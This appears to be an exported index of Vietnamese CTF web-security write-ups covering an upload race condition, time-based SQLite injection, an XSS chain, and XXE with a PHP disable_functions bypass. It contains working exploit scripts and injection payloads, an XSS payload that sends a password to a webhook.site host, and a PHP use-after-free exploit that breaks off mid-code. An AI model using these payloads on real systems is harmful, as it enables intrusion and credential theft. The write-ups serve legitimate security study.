$fileTmpPath = $_FILES[&#39;uploadedFile&#39;][&#39;tmp_name&#39;]; $fileName = basename($_FILES[&#39;uploadedFile&#39;][&#39;name&#39;]); $fileNameCmps = explode(&quot;.&quot;, $fileName); $fileExtension = strtolower(end($fileNameCmps)); $dest_path = $uploadFileDir . $newFileName; $file_temp = create_temp_file($fileTmpPath, $fileName); echo &quot;your file in &quot;.move_upload($file_temp,$fileName); } if(isset($_GET[&quot;clear_cache&quot;])){ system(&quot;rm -r storage/app/uploads/*&quot;); }?&amp;gt;Khi m·ªôt file ƒë∆∞·ª£c upload l√™n server th√¨ s·∫Ω ƒë∆∞·ª£c x·ª≠ l√≠ nh∆∞ sau: Copy file t·ª´ v·ªã tr√≠ m·∫∑c ƒë·ªãnh (ƒë∆∞·ª£c config trong php khi upload l√™n server) ƒë·∫øn ƒë∆∞·ªùng d·∫´n storage/app/temp/ v·ªõi t√™n l√† t√™n c·ªßa file upload (t·∫°m g·ªçi file n√†y l√† file copy). Di chuy·ªÉn file copy v·ª´a ƒë∆∞·ª£c t·∫°o ƒë·∫øn storage/app/uploads/, t√™n file s·∫Ω ƒë∆∞·ª£c th√™m v√†o tr∆∞·ªõc m·ªôt random string. Sau 1s, ti·∫øn h√†nh x√≥a file copy.Dockerfile:RUN chmod 777 /var/www/html/storage/app/temp/RUN chmod 777 /var/www/html/storage/app/uploads/RUN chmod 555 /var/www/html/index.phpRUN chmod 555 /var/www/html/.htaccessT·ª´ file docker n√†y m√¨nh th·∫•y ƒë∆∞·ª£c index.php, .htaccess ·ªü th∆∞ m·ª•c /var/www/html/ ch·ªâ c√≥ quy·ªÅn read v√† execute. Trong khi ·ªü 2 th∆∞ m·ª•c temp v√† uploads th√¨ c√≥ full permission.my-apache2.conf:&amp;lt;Directory /var/www/html&amp;gt; Options Indexes FollowSymLinks AllowOverride All Require all granted&amp;lt;/Directory&amp;gt;ƒêo·∫°n code c·∫•u h√¨nh n√†y c√≥ nghƒ©a l√† n·∫øu c√≥ 1 request n√†o ƒë√≥ y√™u c·∫ßu 1 file/th∆∞ m·ª•c thu·ªôc /var/www/html ho·∫∑c subfolder c·ªßa /var/www/html th√¨ server s·∫Ω t√¨m c√°c file .htaccess trong /var/www/html ho·∫∑c subfolder t√πy thu·ªôc v√†o v·ªã tr√≠ file ƒë∆∞·ª£c request sau ƒë√≥ d√πng n√≥ ƒë·ªÉ overwrite c√°c settings c·ªßa Apache. C√°c b·∫°n c√≥ th·ªÉ xem 1 v√≠ d·ª• t·∫°i ƒë√¢y..htaccess: RewriteCond %{REQUEST_FILENAME} -f RewriteCond %{REQUEST_FILENAME} !/storage/app/temp/.* RewriteCond %{REQUEST_FILENAME} !/storage/app/uploads/.* RewriteRule !^index.php index.php [L,NC] RewriteCond %{REQUEST_FILENAME} -f RewriteCond %{REQUEST_FILENAME} \\.php$ RewriteRule !^index.php index.php [L,NC] RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L]File setting n√†y s·∫Ω th·ª±c hi·ªán vi·ªác check nh∆∞ sau: 4 d√≤ng ƒë·∫ßu: n·∫øu requested file kh√¥ng t·ªìn t·∫°i trong /storage/app/temp/ ho·∫∑c /storage/app/uploads/ th√¨ redirect ƒë·∫øn index.php 3 d√≤ng ti·∫øp: n·∫øu requested file k·∫øt th√∫c b·∫±ng .php th√¨ redirect ƒë·∫øn index.php 2 d√≤ng cu·ªëi: n·∫øu requested file kh√¥ng t·ªìn t·∫°i th√¨ redirect ƒë·∫øn index.phpC√°c h∆∞·ªõng th·ª≠ ti·∫øp c·∫≠n: Upload 1 file php sau ƒë√≥ access t·ªõi storage/app/uploads/&amp;lt;filename&amp;gt;.php ƒë·ªÉ th·ª±c thi code -&amp;gt; nh∆∞ ƒë√£ n√≥i ·ªü tr√™n c√°ch n√†y s·∫Ω kh√¥ng kh·∫£ thi v√¨ kh√¥ng th·ªèa ƒëi·ªÅu ki·ªán th·ª© hai ƒë√£ ƒë·ªÅ c·∫≠p. Th·ª≠ overwrite file .htaccess ·ªü /var/www/html/ b·∫±ng path traversal ƒë·ªÉ t·ª± config l·∫°i -&amp;gt; c√°ch n√†y c≈©ng kh√¥ng kh·∫£ thi v√¨ s·∫Ω c√≥ m·ªôt random string th√™m v√†o tr∆∞·ªõc t√™n file v√† ta kh√¥ng c√≥ quy·ªÅn write ·ªü th∆∞ m·ª•c n√†y.Sau 1 h·ªìi ƒë·ªçc l·∫°i source th√¨ m√¨nh m·ªõi nh·∫≠n ra d·ª•ng √Ω c·ªßa t√°c gi·∫£. T·∫°i sao ta kh√¥ng move tr·ª±c ti·∫øp file upload t·ª´ v·ªã tr√≠ m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c c·∫•u h√¨nh trong php (·ªü /tmp) ƒë·∫øn storage/app/uploads/ m√† ph·∫£i t·∫°o th√™m storage/app/temp/ ?. M·ªôt ƒëi·ªÉm ƒë√°ng ch√∫ √Ω n·ªØa l√† server s·∫Ω sleep(1) sau khi copy($source,$des); r·ªìi m·ªõi unlink($source); -&amp;gt; race conditionC·ª• th·ªÉ h∆°n c√°ch khai th√°c c·ªßa m√¨nh nh∆∞ sau: file exp.php3 ch·ª©a ƒëo·∫°n code ƒë·ªÉ RCE. file .htaccess s·∫Ω c·∫•u h√¨nh ƒë·ªÉ t·∫•t c·∫£ c√°c file .php3 th·ª±c thi ƒë∆∞·ª£c php code. D√πng 3 thread: thread 1 v√† 2 d√πng ƒë·ªÉ upload ƒë·ªìng th·ªùi hai file exp.php3 v√† .htaccess -&amp;gt; 2 file n√†y s·∫Ω ƒë∆∞·ª£c copy ƒë·∫øn storage/app/temp/, thread c√≤n l·∫°i s·∫Ω access t·ªõi storage/app/temp/exp.php3 ƒë·ªÉ l·∫•y response.Khai th√°c.htaccess:AddType application/x-httpd-php .php3exp.php3&amp;lt;?php phpinfo(); ?&amp;gt;exploit.py:pyimport osfrom threading import Threadimport requestsNumberofThreads = 10TARGET = &quot;https://uploadz-web.crewctf-2022.crewc.tf/&quot;def upload_htaccess(): r = requests.post(TARGET, files = {&quot;uploadedFile&quot;: open(&quot;.htaccess&quot;, &quot;r&quot;)}) def upload_php3(): r = requests.post(TARGET, files = {&quot;uploadedFile&quot;: open(&quot;exp.php3&quot;, &quot;r&quot;)})def get_request(): r = requests.get(TARGET + &quot;storage/app/temp/exp.php3&quot;) f = open(&quot;phpinfo.html&quot;, &quot;w&quot;) f.write(r.text) #print(r.text)for i in range(NumberofThreads): t1 = Thread(target=upload_htaccess) t2 = Thread(target=upload_php3) t3 = Thread(target=get_request) t1.start() t2.start() t3.start()ƒê·∫ßu ti√™n c·∫ßn th√¥ng tin v·ªÅ c√°c disable_functions n√™n s·∫Ω d√πng phpinfo();phpinfoSau ƒë√≥ ch·ªânh l·∫°i file exp.php3&amp;lt;?php system(&quot;cat /flag.txt&quot;); ?&amp;gt;result crewctf{upload_rce_via_race}3. Marvel PickB√†i n√†y l√† m·ªôt d·∫°ng sqlite injectionLink challengehttp://104.155.50.189:1337/OverviewoverviewPh√¢n t√≠chCtrl + U -&amp;gt; ƒë·ªÉ view source trang web.&amp;lt;script&amp;gt; const marvel = [ &#39;spiderman&#39;, &#39;ironman&#39;, &#39;captainamerica&#39;, &#39;nickfury&#39; ] function fetchMarvelVotesCount (marvel) { fetch(`/api.php?character=${marvel}`) .then(response =&amp;gt; response.json()) .then(results =&amp;gt; { const vote_count_html = document.querySelector(`#vote-count-${marvel}`) const total_vote = results.data.vote_count if (total_vote &amp;gt; 1) { vote_count_html.innerHTML = `${total_vote} Votes` } else { vote_count_html.innerHTML = `${total_vote} Vote` } }) } function vote (marvel) { const formData = new FormData() formData.append(&#39;character&#39;, marvel) fetch(&#39;/api.php&#39;, { method: &#39;POST&#39;, body: formData }) .then(response =&amp;gt; response.json()) .then(result =&amp;gt; { if (result.success) { fetchMarvelVotesCount(marvel) alert(&#39;successful voting&#39;) } else { alert(result.error) } }) .catch(error =&amp;gt; { alert(&#39;error&#39;); }); } marvel.forEach(item =&amp;gt; { fetchMarvelVotesCount(item) })&amp;lt;/script&amp;gt;Khi ·∫•n Vote s·∫Ω c√≥ 2 request ƒë∆∞·ª£c g·ª≠i ƒëi.Sau m·ªôt h·ªìi fuzz th√¨ m√¨nh th·∫•y c√≥ l·ªói sqli ·ªü parameter charactersql errorB√™n c·∫°nh ƒë√≥ c√°c k√≠ t·ª± *,-,/,=, v√† or, select, where ƒë·ªÅu b·ªã replace th√†nh &quot;&quot;.Ti·∫øp t·ª•c th·ª≠ c√°c payload th√¨ m√¨nh nh·∫≠n ra n·∫øu c√¢u truy v·∫•n th√†nh c√¥ng th√¨ s·∫Ω tr·∫£ v·ªÅ name b·∫±ng ch√≠nh gi√° tr·ªã c·ªßa character.successsql errorv√† c≈©ng b·∫±ng c√°ch n√†y ta x√°c ƒë·ªãnh ƒë∆∞·ª£c server d√πng sqlite.sqlite detectB√†i n√†y ƒë·ªÉ gi·∫£i m√¨nh ch·ªçn c√°ch khai th√°c theo time based sqli v·ªõi h√†m RANDOMBLOB() v√† IIF()L√∫c gi·∫£i m√¨nh kh√¥ng vi·∫øt script ƒë·ªÉ solve t·ª´ a-z m√† l√†m t·ª´ng ƒëo·∫°n nh∆∞ng m√¨nh v·∫´n s·∫Ω ƒë·ªÉ payload t√≠ch c√≥p ƒë∆∞·ª£c ƒë·ªÉ t√¨m table name, column name, ‚Ä¶ ·ªü b√™n d∆∞·ªõi.Payload cho sqlite injectionTable:# find length?character=&#39;||IIF((SELECT LENGTH(tbl_name) FROM sqlite_master LIMIT {index},1) LIKE {len},1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;#find table name &#39;||IIF((SELECT HEX(SUBSTR(tbl_name,{pos},1)) FROM sqlite_master LIMIT {index},1) LIKE HEX(&#39;{c}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;Column:#find column name &#39;||IIF((SELECT HEX(SUBSTR(name,{pos},1)) FROM pragma_table_info(&#39;&amp;lt;table name goes here&amp;gt;&#39;) LIMIT {index},1) LIKE HEX(&#39;{char}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;Sau m·ªôt h·ªìi bruteforce ƒë·ªÉ t√¨m th√¥ng tin th√¨ m√¨nh t·ªïng k·∫øt l·∫°i ƒë∆∞·ª£c nh∆∞ sau:Number of table: 2 characters flagsNumber of flags‚Äôs column: 2 id valueKhai th√°cimport requestsfrom time import timefrom string import printableTARGET = &quot;http://104.155.50.189:1337/api.php&quot;def encode_all(string): return &quot;&quot;.join(&quot;%{0:0&amp;gt;2}&quot;.format(format(ord(char), &quot;x&quot;)) for char in string)for i in range(1,34): if(flag.endswith(&#39;}&#39;)): break for c in printable: if c == &#39;\\&#39;&#39;: continue query = f&quot;&#39;||IIF((SELECT HEX(SUBSTR(value,{i},1)) FROM flags) LIKE HEX(&#39;{c}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;&quot; # print(query) query_urlencoded = encode_all(query) start = time() r = requests.get(TARGET + &quot;?character=&quot; +query_urlencoded) end = time() # print(end - start) if(end - start &amp;lt; 0.8): flag += c print(flag) break crew{so_its_n0t_on3_line_for_exp}4. Marvel Pick AgainB√†i n√†y th√¨ c≈©ng t∆∞∆°ng t·ª± b√†i tr∆∞·ªõc ch·ªâ kh√°c l√† length c·ªßa character ph·∫£i &amp;lt;= 75No No NON√™n vi·ªác m√¨nh l√†m l√† t·ªëi ∆∞u l·∫°i length c·ªßa payloadKhai th√°cimport requestsfrom time import timefrom string import printableTARGET = &quot;http://104.155.50.189:3390/api.php&quot;for i in range(1,41): if(flag.endswith(&#39;}&#39;)): break for c in printable: if c != &#39;\\&#39;&#39; and c != &#39;*&#39; and c != &#39;-&#39; and c != &#39;/&#39; and c!= &#39;;&#39; and c!= &#39;=&#39;: query = f&quot;&#39;||IIF((SELECT SUBSTR(value,{i},1) FROM flags)&amp;lt;&amp;gt;&#39;{c}&#39;,1,RANDOMBLOB(999999))||&#39;&quot; query_urlencoded = encode_all(query) start = time() r = requests.get(TARGET + &quot;?character=&quot; +query_urlencoded) end = time() #print(end - start) if(end - start &amp;gt; 0.8): flag += c print(flag) break crew{y3sss_y0u_g0t_m3_h1_1_st4rn_n_n1n0}" }, { "title": "NoCookies - DiceCTF2022", "url": "/posts/noCookies/", "categories": "WebSec, CTF", "tags": "sqli, xss", "date": "2022-04-08 13:07:00 +0700", "snippet": "Link challengehttps://instancer.mc.ax/no-cookieshttps://admin-bot.mc.ax/no-cookiesSource codeDownloadS∆° l∆∞·ª£c v·ªÅ trang weboverview S·∫Ω c√≥ 2 ch·ª©c nƒÉng: Register -&amp;gt; ƒëƒÉng k√≠ account v√† create note -&amp;gt; t·∫°o note Ho·∫°t ƒë·ªông kh√¥ng d·ª±a tr√™n cookie m√† y√™u c·∫ßu ta nh·∫≠p l·∫°i username, password m·ªói l·∫ßn th·ª±c hi·ªán m·ªôt h√†nh ƒë·ªông n√†o ƒë√≥.·ªû ph·∫ßn Create Note th√¨ ta c√≥ 2 t√πy ch·ªçn l√† Markdown ho·∫∑c l√† Plain.create note optionPh√¢n t√≠ch1. XSS qua markdown optionƒê·ªçc qua source code th√¨ th·∫•y ph·∫ßn l·ªõn c√°c trang view.html, register.html ƒë·ªÅu thu·ªôc d·∫°ng client side renderingmarkdown note handerƒêi·ªÅu ƒë√°ng ch√∫ √Ω ·ªü ƒëo·∫°n code n√†y l√† n·∫øu note nh·∫≠p v√†o c√≥ d·∫°ng [blabla](test) th√¨ s·∫Ω return th·∫ª a: &amp;lt;a href = &quot;test&quot;&amp;gt;blabla&amp;lt;/a&amp;gt;T·ª´ ƒë√¢y c√≥ th·ªÉ d·ªÖ d√†ng khai th√°c XSS: ta d√πng 2 thu·ªôc t√≠nh autofocus v√† onfocus ƒë·ªÉ trigger n√≥&amp;lt;a href =&quot;test&quot; autofocus onfocus= &quot;alert`1&quot;&amp;gt;ƒêi·ªÅu ƒë√°ng bu·ªìn l√† khi t·∫°o note:(foo)[http://example.com&quot; autofocus=autofocus onfocus=&quot;alert(password&amp;amp;#x29;](·ªü ƒë√¢y escape ) tr·ªü th√†nh &amp;amp;#x29; ƒë·ªÉ cho regex kh√¥ng l√†m m·∫•t ƒëi ) )G·ª≠i note v√† ·∫•n view xu·∫•t hi·ªán pop-up undefined üòüQuay l·∫°i source code th·∫•y r·∫±ng const password, ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong m·ªôt anonymous arrow function v√† ƒëo·∫°n code ƒë∆∞·ª£c th·ª±c thi b√™n ngo√†i n√≥ (ƒë·∫øn t·ª´ HTML event handler)Nh√¨n l·∫°i source, ƒë·ªÉ √Ω c√°ch validate password:const validate = (text) =&amp;gt; {return /^[^$&#39;]+$/.test(text ?? &#39;&#39;);}Ch·ªâ ƒë∆°n gi·∫£n l√† ki·ªÉm tra sao cho ph·∫£i c√≥ t·ªëi thi·ªÉu 1 k√≠ t·ª± v√† kh√¥ng t·ªìn t·∫°i &#39; ho·∫∑c $M√¨nh t√¨m ƒë∆∞·ª£c m·ªôt th·ª© th√∫ v·ª• v·ªÅ Regex. ƒê·∫°i kh√°i l√†: RegExp.input ho·∫∑c RegExp.$_ s·∫Ω tr·∫£ v·ªÅ chu·ªói match v·ªõi regular expression.V√≠ d·ª•:var re = /hi/g;re.test(&#39;hi there!&#39;);RegExp.input; // &quot;hi there!&quot;re.test(&#39;foo&#39;); // new test, non-matchingRegExp.$_; // &quot;hi there!&quot;re.test(&#39;hi world!&#39;); // new test, matchingRegExp.$_; // &quot;hi world!&quot;Nh∆∞ng t·∫•t c·∫£ nh·ªØng .replace() call t·ª´ markdown parsing ƒë√£ l√†m thay ƒë·ªïi gi√° tr·ªã c·ªßa n√≥ (overiding the password) v√¨ v·∫≠y kh√¥ng th·ªÉ khai th√°c th√¥ng qua markdown note -&amp;gt; ch·ªâ c√≤n l·∫°i con ƒë∆∞·ªùng plain note.2. XSS qua plain optiondatabase handler code1database handler code2Ta c√≥ th·ªÉ th·∫•y tr∆∞·ªõc khi ch√®n v√†o DB, note b·ªã replace &amp;lt; v√† &amp;gt; g√¢y kh√≥ khƒÉn cho vi·ªác khai th√°c.Nh∆∞ng prepare function ƒë√£ gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ n√†y, h√†m n√†y ƒë∆°n gi·∫£n ch·ªâ l√† replace l·∫ßn l∆∞·ª£t :id, :username, :note, :mode th√†nh c√°c gi√° tr·ªã t∆∞∆°ng ·ª©ng v·ªõi n√≥.{id: &quot;12345&quot;,username: &quot;:note&quot;,note: &#39;, :mode, 22, 0)-- &#39;,mode: &#39;&amp;lt;img src=x onerror=&quot;alert(RegExp.input)&quot;&amp;gt;&#39;,}sqli pocKhai th√°cresponseresultOverwrite ‚Äúdocument.querySelector‚Äù v√† ‚ÄúJSON.stringify‚Äù·ªü ph·∫ßn n√†y m√¨nh s·∫Ω ƒë·ªÅ c·∫≠p t·ªõi m·ªôt c√°ch khai th√°c kh√°c.C√°ch n√†y th√¨ v·∫´n v·∫≠n d·ª•ng sqli nh∆∞ c√°ch tr∆∞·ªõc ƒë·ªÉ ch√®n xss note v√†o db nh∆∞ng kh√°c ·ªü ch·ªó xss note s·∫Ω l√†:&amp;lt;svg&amp;gt;&amp;lt;svg/onload=&quot;document.querySelector=function(){JSON.stringify=a=&amp;gt;fetch(`https://webhook.site/1e6c4248-b312-498b-93c3-073ffc762693?`+a.password),arguments.callee.caller()}&quot;&amp;gt;Code n√†y th·ª±c hi·ªán vi·ªác rewrite l·∫°i h√†m document.querySelector v√† JSON.stringify, sau ƒë√≥ g·ªçi arguments.callee.caller() Line 59 th·ª±c hi·ªán g√°n innerHTML = Plain note c·ªßa ta ƒë·ªìng th·ªùi k√≠ch ho·∫°t onload event c·ªßa svg th·ª±c hi·ªán vi·ªác ghi ƒë√® h√†m document.querySelector. Line 60 g·ªçi t·ªõi document.querySelector (l√∫c n√†y l√† h√†m m√† ta ƒë√£ ƒë·ªãnh nghƒ©a l·∫°i): th·ª±c hi·ªán ghi ƒë√® h√†m JSON.stringify v√† ƒë·ªìng th·ªùi g·ªçi t·ªõi arguments.callee.caller(). C√≥ th·ªÉ hi·ªÉu arguments.callee l√† ch·ªâ h√†m hi·ªán t·∫°i ƒëang th·ª±c thi -&amp;gt; document.querySelector v√† arguments.callee.caller() l√† h√†m g·ªçi t·ªõi n√≥, ch√≠nh l√† c√°i async () bao tr·ªçn t·∫•t c·∫£ code. Hay n√≥i c√°ch kh√°c m·ª•c ƒë√≠ch c·ªßa arguments.callee.caller() l√† ƒë·ªÉ ch·∫°y l·∫°i ƒëo·∫°n code t·ª´ 24 ‚Äì 62 m·ªôt l·∫ßn n·ªØa. L√∫c n√†y JSON.stringify nh·∫≠n v√†o m·ªôt object bao g·ªìm password s·∫Ω th·ª±c hi·ªán fetch t·ªõi web hook c·ªßa ta v√† boom flag! dice{curr3nt_st4t3_0f_j4v45cr1pt}Tham kh·∫£ohttps://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html" }, { "title": "31 Line PHP - SPbCTF2021", "url": "/posts/31linephp/", "categories": "WebSec, CTF", "tags": "xxe, rce", "date": "2022-04-05 23:35:00 +0700", "snippet": "Challenge n√†y t·ª´ nƒÉm ngo√°i nh∆∞ng m√¨nh v·∫´n mu·ªën vi·∫øt b·ªüi 1 ph·∫ßn n√≥ kh√° hay v√† l√≠ do ngo√†i l·ªÅ kh√°c l√† nƒÉm nay m√¨nh m·ªõi t·∫≠p t√†nh vi·∫øt blog üòùSource codesource codePh√¢n t√≠chNh√¨n qua source code th√¨ ta s·∫Ω ph·∫£i POST d·ªØ li·ªáu data=xxxx v√† m·ªôt file. Server s·∫Ω check session c·ªßa ta n·∫øu kh√¥ng c√≥ th√¨ s·∫Ω t·∫°o random m·ªôt sess_id v√† d√πng sess_id n√†y ƒë·ªÉ l√†m th∆∞ m·ª•c cha c·ªßa file upload.2 d√≤ng comment kh√° th√∫ v·ªã, li√™n quan ƒë·∫øn l·ªói XXE c·ªßa Wordpress 3.9.2. Ti·∫øp t·ª•c search th√¨ m√¨nh t√¨m ra m·ªôt blog v·ªÅ m·ªôt bug kh√°c c≈©ng c·ªßa Wordpress li√™n quan ƒë·∫øn XXE. libxml_disable_entity_loader(true) ƒë∆∞·ª£c th√™m v√†o ·ªü ƒë√¢y ƒë·ªÉ config XML parser t·∫Øt t√≠nh nƒÉng load external entity v√† t√≠nh nƒÉng n√†y n√™n ƒë∆∞·ª£c √°p d·ª•ng v·ªõi c√°c version PHP &amp;lt; 8, k·ªÉ t·ª´ 8 tr·ªü ƒëi th√¨ PHP d√πng libxml t·ª´ version 2.9.0 (disable XXE bydefault) n√™n libxml_disable_entity_loader() kh√¥ng ƒë∆∞·ª£c d√πng n·ªØa.T·ª´ ƒë√≥ ta c√≥ th·ªÉ th·∫•y kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨ ·ªü ƒëo·∫°n code n√†y nh∆∞ng loadXML() ·ªü d√≤ng code d∆∞·ªõi th√¨ sao?. B·ªüi v√¨ n√≥ ƒë∆∞·ª£c th·ª±c thi v·ªõi flag LIBXML_NOENT n√™n s·∫Ω enable entity substitution. C·ª• th·ªÉ h∆°n l√†:LIBXML_NOENTV√¨ v·∫≠y ta v·∫´n c√≥ th·ªÉ l·ª£i d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ √°p d·ª•ng kƒ© thu·∫≠t XXE üòäTh·ª≠ upload m·ªôt file test.xml:test.htmlV·ªõi PHPSESSID trong cookie c·ªßa tapython scriptTa ƒë∆∞·ª£c:responeXXE th√†nh c√¥ng nh∆∞ng s·∫Ω kh√¥ng c√≥ c√°ch n√†o t√¨m ƒë∆∞·ª£c file flag v√¨ XXE theo c√°ch n√†y ch·ªâ c√≥ th·ªÉ retrieve file t·ª´ xa b√™n ph√≠a server üòê v√¨ v·∫≠y m√¨nh ƒë√£ kh√¥ng gi·∫£i ra.Sau khi ƒë·ªçc wu th√¨ m·ªõi ph√°t hi·ªán ra r·∫±ng file ta upload l√™n ƒë∆∞·ª£c x√≥a ·ªü cu·ªëi unlink() sau khi ƒë∆∞·ª£c parse XML. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† n·∫øu ta upload m·ªôt file PHP v√† truy c·∫≠p file ƒë√≥ m·ªôt l·∫ßn n·ªØa th√¥ng qua XML. V√† d√πng php://filter ƒë·ªÉ encode base64 th√¨ c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c output c·ªßa file php (sau khi th·ª±c thi b√™n ph√≠a server) qua response. ƒê·ªÉ √Ω m·ªôt ƒëi·ªÉm n·ªØa l√† file upload ƒë∆∞·ª£c l∆∞u t·∫°i th∆∞ m·ª•c var/www/html/upload/$id/$name n√™n suy ƒëo√°n th∆∞ m·ª•c root c·ªßa web server s·∫Ω l√† /var/www/html. Suy ra ta c√≥ th·ªÉ access ƒë·∫øn file upload b√™n ph√≠a server th√¥ng qua ƒë∆∞·ªùng d·∫´n http://62.84.114.238/upload/$id/$FILENAME&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php&quot; &amp;gt;]&amp;gt;&amp;lt;creds&amp;gt;&amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt;&amp;lt;pass&amp;gt;&amp;lt;/pass&amp;gt;&amp;lt;/creds&amp;gt;&amp;lt;?php phpinfo(); ?&amp;gt;Ta ch·ªânh l·∫°i file upload v·ªõi phpinfo(); v√† ƒë·ªÉ server th·ª±c thi ƒë∆∞·ª£c file php th√¨ ch·ªânh lu√¥n extension th√†nh .phpresponeTh√†nh c√¥ng base64 decode v√† m·ªü b·∫±ng tr√¨nh duy·ªát:phpinfoüòë C√°c function c√≥ th·ªÉ d√πng ƒë·ªÉ rce ƒë·ªÅu b·ªã filter.Nh∆∞ng c√°i disable_functions n√†y c√≥ th·ªÉ bypass ƒë∆∞·ª£c d·ª±a v√†o bug 0day ƒë∆∞·ª£c published PoC. T·∫°i th·ªùi ƒëi·ªÉm publish, bug n√†y c√≥ th·ªÉ d√πng ƒë·ªÉ bypass h·∫ßu nh∆∞ m·ªçi PHP versions v√† khai th√°c d·ª±a tr√™n memory corruption.Khai th√°cimport requestsimport reimport base64TARGET = &#39;http://62.84.114.238&#39;while 1: COMMAND = str(input(&#39;$ &#39;)) with open(&#39;payload.php&#39;, &#39;w&#39;) as f: f.write(&quot;&quot;&quot;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/ebb8f496d6241dfd214351614c852de7/payload.php&quot; &amp;gt; ]&amp;gt;&amp;lt;creds&amp;gt; &amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt; &amp;lt;pass&amp;gt;mypass&amp;lt;/pass&amp;gt;&amp;lt;/creds&amp;gt;&quot;&quot;&quot; + &quot;&quot;&quot;&amp;lt;?php # PHP 7.0-8.0 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=54350# # This exploit should work on all PHP 7.0-8.0 versions# released as of 2021-10-06## Author: https://github.com/mm0r1pwn(&#39;{}&#39;);&quot;&quot;&quot;.format(COMMAND) + r&quot;&quot;&quot;function pwn($cmd) { define(&#39;LOGGING&#39;, false); define(&#39;CHUNK_DATA_SIZE&#39;, 0x60); define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE); define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50); define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1); define(&#39;CMD&#39;, $cmd); for($i = 0; $i &amp;lt; 10; $i++) { $groom[] = Pwn::alloc(STRING_SIZE); } stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;); $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;); stream_filter_append($fd,&#39;pwn_filter&#39;); fwrite($fd, &#39;x&#39;);}class Helper { public $a, $b, $c; }class Pwn extends php_user_filter { private $abc, $abc_addr; private $helper, $helper_addr, $helper_off; private $uafp, $hfp; public function filter($in, $out, &amp;amp;$consumed, $closing) { if($closing) return; stream_bucket_make_writeable($in); $this-&amp;gt;filtername = Pwn::alloc(STRING_SIZE); fclose($this-&amp;gt;stream); $this-&amp;gt;go(); return PSFS_PASS_ON; } private function go() { $this-&amp;gt;abc = &amp;amp;$this-&amp;gt;filtername; $this-&amp;gt;make_uaf_obj(); $this-&amp;gt;helper = new Helper; $this-&amp;gt;helper-&amp;gt;b = function($x) {}; $this-&amp;gt;helper_addr = $this-&amp;gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2; $this-&amp;gt;log(&quot;helper @ 0x%x&quot;, $this-&amp;gt;helper_addr); $this-&amp;gt;abc_addr = $this-&amp;gt;helper_addr - CHUNK_SIZE; $this-&amp;gt;log(&quot;abc @ 0x%x&quot;, $this-&amp;gt;abc_addr); $this-&amp;gt;helper_off = $this-&amp;gt;helper_addr - $this-&amp;gt;abc_addr - 0x18; $helper_handlers = $this-&amp;gt;str2ptr(CHUNK_SIZE); $this-&amp;gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers); $this-&amp;gt;prepare_leaker(); $binary_leak = $this-&amp;gt;read($helper_handlers + 8); $this-&amp;gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak); $this-&amp;gt;prepare_cleanup($binary_leak); $closure_addr = $this-&amp;gt;str2ptr($this-&amp;gt;helper_off + 0x38); $this-&amp;gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr); $closure_ce = $this-&amp;gt;read($closure_addr + 0x10); $this-&amp;gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce); $basic_funcs = $this-&amp;gt;get_basic_funcs($closure_ce); $this-&amp;gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs); $zif_system = $this-&amp;gt;get_system($basic_funcs); $this-&amp;gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system); $fake_closure_off = $this-&amp;gt;helper_off + CHUNK_SIZE * 2; for($i = 0; $i &amp;lt; 0x138; $i += 8) { $this-&amp;gt;write($fake_closure_off + $i, $this-&amp;gt;read($closure_addr + $i)); } $this-&amp;gt;write($fake_closure_off + 0x38, 1, 4); $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68; $this-&amp;gt;write($fake_closure_off + $handler_offset, $zif_system); $fake_closure_addr = $this-&amp;gt;helper_addr + $fake_closure_off - $this-&amp;gt;helper_off; $this-&amp;gt;write($this-&amp;gt;helper_off + 0x38, $fake_closure_addr); $this-&amp;gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr); $this-&amp;gt;cleanup(); ($this-&amp;gt;helper-&amp;gt;b)(CMD); } private function make_uaf_obj() { $this-&amp;gt;uafp = fopen(&#39;php://memory&#39;, &#39;w&#39;); fwrite($this-&amp;gt;uafp, pack(&#39;QQQ&#39;, 1, 0, 0xDEADBAADC0DE)); for($i = 0; $i &amp;lt; STRING_SIZE; $i++) { fwrite($this-&amp;gt;uafp, &quot;\\x00&quot;); } } private function prepare_leaker() { $str_off = $this-&amp;gt;helper_off + CHUNK_SIZE + 8; $this-&amp;gt;write($str_off, 2); $this-&amp;gt;write($str_off + 0x10, 6); $val_off = $this-&amp;gt;helper_off + 0x48; $this-&amp;gt;write($val_off, 